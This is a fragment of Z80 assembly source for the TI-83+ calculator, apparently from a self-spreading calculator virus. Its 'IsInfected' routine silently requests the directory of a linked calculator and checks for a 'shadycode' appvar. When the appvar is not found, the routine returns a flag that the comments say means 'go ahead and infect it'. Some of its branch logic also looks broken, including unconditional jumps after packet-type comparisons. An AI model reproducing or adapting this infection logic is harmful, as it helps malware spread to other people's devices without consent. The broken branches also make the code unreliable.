IsInfected:
	;Check to see if Calc is there and ready:
	ld a, 83h			;TI-83
	b_call SendAByte	
	ld a, 68h			;Chk Rdy
	b_call SendAByte
	tempcall SendTwoZeros	;0x00, 0x00

	;other Calc should respond with "Clear to send (CTS)" (56h)
	b_call RecAByteIO
	cp 73h 				;Is this a TI-83+ responding? If not, yikes!
	jr nz, dirhateralert	;Hater alert! Abort! Abort!
	b_call RecAByteIO
	cp 56h				;CTS?
	jr nz, dirhateralert	;other calc is not receiving anything. abort.
	b_call RecAByteIO ;0x00
	b_call RecAByteIO ;0x00
	jr dirnohater

dirhateralert:
	b_call RecAByteIO
	b_call RecAByteIO
	xor a
	ret

dirnohater:
	;send "73 A2 0D 00 00 00 19 00 00 00 00 00 00 00 00 00 00 19 00  	(Directory request)"
	ld a, 73h			;calc sending TI-83+ data
	b_call SendAByte	
	ld a, 0A2h			;Silent req variable	
	b_call SendAByte
	ld a, 0Dh			;length byte 2
	b_call SendAByte	
	ld a, 00h			;length byte 1	
	b_call SendAByte
	tempcall SendTwoZeros
	ld a, 19h			;dir request
	b_call SendAByte	
	tempcall SendTwoZeros
	tempcall SendTwoZeros
	tempcall SendTwoZeros
	tempcall SendTwoZeros
	tempcall SendTwoZeros
	ld a, 19h			;checksum byte 2
	b_call SendAByte	
	ld a, 00h			;checksum byte 1	
	b_call SendAByte

	b_call RecAByteIO
	cp 73h					;best be a ti-83+
	jr nz, dirhateralert
	b_call RecAByteIO
	cp 56h					;request received ack
	jr nz, dirhateralert
	b_call RecAByteIO		;0x00
	b_call RecAByteIO		;0x00

	b_call RecAByteIO
	cp 73h
	jr nz, dirhateralert
	b_call RecAByteIO
	cp 15h					;free memory
	jr nz, dirhateralert

	tempcall Rec4Bytes		;6 more bytes of crap we don't care about
	b_call RecAByteIO
	b_call RecAByteIO

	tempcall SendDataAck

	;now it's going to keep sending all the variables on the other calculator
ReadDirData:
	b_call RecAByteIO
	cp 73h
	jr nz, DontInfect	;something is wrong

	b_call RecAByteIO ;this is what kind of packet it is
	cp 06h	;var header
	jr z, ReadDirVar
	cp 92h	;end of transmission
	jr EndOfDirData
	cp 56h	;ack
	jr DirHandleAck

	;something else spooky, play it safe
	jr DontInfect

DirHandleAck:
	b_call RecAByteIO
	b_call RecAByteIO
	jr ReadDirData

ReadDirVar:
	b_call RecAByteIO
	b_call RecAByteIO

	;skip header and var length
	tempcall Rec4Bytes

	;read in type:
	b_call RecAByteIO
	cp 15h ;appvar
	jr z, DirAppVarCheck
	
	;not an appvar, nobody cares about it. read in the other 10 bytes
	tempcall Rec4Bytes 
	tempcall Rec4Bytes
	b_call RecAByteIO
	b_call RecAByteIO

	tempcall SendDataAck ;next please
	jr ReadDirData

DirAppVarCheck:
	;this is an appvar, but is it the shadycode appvar?
	;incoming: 8 bytes null padded var name
	;setup hl pointing at the shadycode appvar name
	templd hl, ShadyCodeAppVar+1 ;skip appvar obj token
	ld b, 8 ;compare 8 bytes
CompareStringLoop:
	ld c, (hl)

	push hl
    push bc
	b_call RecAByteIO
	pop bc
	pop hl

	cp c
	jr nz, DirAppVarCheckNoMatch
	inc hl
	dec b

	ld a, 00
	cp b
	jr nz, CompareStringLoop

	jr ReadDirVar

DirAppVarCheckNoMatch:
	;receive however many bytes there are in b
	b_call RecAByteIO

	dec b
	ld a, 00
	cp b
	jr nz, DirAppVarCheckNoMatch

	;two more stupid bytes - version and archived
	b_call RecAByteIO
	b_call RecAByteIO
	jr ReadDirVar


EndOfDirData:
	;0x00, 0x00
	b_call RecAByteIO
	b_call RecAByteIO

	tempcall SendDataAck
	;didn't find anything interesting on the calc, go ahead and infect it
	ld a, 01
	ret					   

DontInfect:
	xor a
	ret

SendDataAck:
	ld a, 73h		
	b_call SendAByte	
	ld a, 56h			;ack
	b_call SendAByte
	tempcall SendTwoZeros
	ret
